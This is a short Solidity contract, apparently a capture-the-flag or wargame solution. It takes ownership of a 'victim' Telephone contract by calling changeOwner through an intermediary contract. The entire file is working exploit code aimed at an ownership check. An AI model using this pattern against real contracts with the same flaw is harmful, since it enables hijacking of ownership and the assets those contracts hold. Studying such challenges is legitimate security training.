// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/ITelephone.sol";

contract TelephoneAttack {
    ITelephone private immutable victimTelephone;

    constructor(ITelephone victimTelephone_) {
        victimTelephone = victimTelephone_;
    }

    function attack() external {
        victimTelephone.changeOwner(msg.sender);

        require(
            msg.sender == victimTelephone.owner(),
            "Telephone: Attack failed"
        );
    }
}
